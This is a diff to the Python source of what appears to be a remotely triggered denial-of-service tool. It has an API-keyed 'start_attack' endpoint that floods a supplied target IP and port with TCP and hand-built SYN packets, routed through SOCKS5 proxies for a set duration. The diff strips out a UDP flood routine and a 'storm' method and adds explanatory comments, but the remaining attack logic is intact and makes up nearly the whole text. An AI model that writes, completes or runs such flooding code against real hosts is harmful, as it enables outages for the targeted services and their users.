@@ -61,23 +61,6 @@ def send_tcp_packet(target_ip, target_port_tcp, method):
         finally:
             sock_tcp.close()
 
-def send_udp_packet(target_ip, target_port_udp):
-    if target_port_udp is None:
-        return
-    proxies = get_proxies()
-    for proxy in proxies:
-        try:
-            sock_udp = create_socket_with_proxy(proxy, socks.SOCKS5)
-            user_agent = random.choice(user_agents)
-            packet_size = random.randint(1, 1024)
-            packet = bytes(packet_size)
-            packet_with_header = f"User-Agent: {user_agent}\r\n\r\n".encode() + packet
-            sock_udp.sendto(packet_with_header, (target_ip, target_port_udp))
-        except Exception as e:
-            pass
-        finally:
-            sock_udp.close()
-
 def send_syn_tcp_packet(target_ip, target_port_tcp):
     if target_port_tcp is None:
         return
@@ -100,7 +83,7 @@ def build_syn_packet(target_ip, target_port_tcp, seq_num, ip_id):
     ip_total_length = 20
     ip_ttl = 64
     ip_protocol = socket.IPPROTO_TCP
-    ip_src = socket.inet_aton("192.168.1.1")
+    ip_src = socket.inet_aton("192.168.1.1")  # Placeholder source IP
     ip_dst = socket.inet_aton(target_ip)
     ip_header = struct.pack("!BBHHHBBH4s4s", 
                             (ip_version << 4) + ip_header_length, 0, ip_total_length, ip_id, 0, ip_ttl, ip_protocol, 0, ip_src, ip_dst)
@@ -109,13 +92,13 @@ def build_syn_packet(target_ip, target_port_tcp, seq_num, ip_id):
     tcp_seq_num = seq_num
     tcp_ack_num = 0
     tcp_data_offset = 5
-    tcp_flags = (1 << 1)
+    tcp_flags = (1 << 1)  # SYN flag
     tcp_window_size = 5840
     tcp_checksum = 0
     tcp_urgent_ptr = 0
     tcp_offset_res = (tcp_data_offset << 4) + 0
     tcp_header = struct.pack("!HHLLBBHHH", tcp_src_port, tcp_dst_port, tcp_seq_num, tcp_ack_num, tcp_offset_res, tcp_flags, tcp_window_size, tcp_checksum, tcp_urgent_ptr)
-    source_address = socket.inet_aton("192.168.1.1")
+    source_address = socket.inet_aton("192.168.1.1")  # Placeholder source IP
     dest_address = socket.inet_aton(target_ip)
     placeholder = 0
     protocol = socket.IPPROTO_TCP
@@ -141,7 +124,6 @@ def start_attack():
         key_from_query = data.get('key')
         target_ip = data.get('target_ip')
         target_port_tcp = data.get('target_port_tcp')
-        target_port_udp = data.get('target_port_udp')
         duration = data.get('duration')
 
         if key_from_query != API_KEY:
@@ -157,10 +139,7 @@ def start_attack():
             if target_port_tcp:
                 send_tcp_packet(target_ip, target_port_tcp, "raw")
                 send_tcp_packet(target_ip, target_port_tcp, "flood")
-                send_tcp_packet(target_ip, target_port_tcp, "storm")
                 send_syn_tcp_packet(target_ip, target_port_tcp)
-            if target_port_udp:
-                send_udp_packet(target_ip, target_port_udp)
             time.sleep(0.01)
 
         return jsonify({'message': 'Attack completed'}), 200
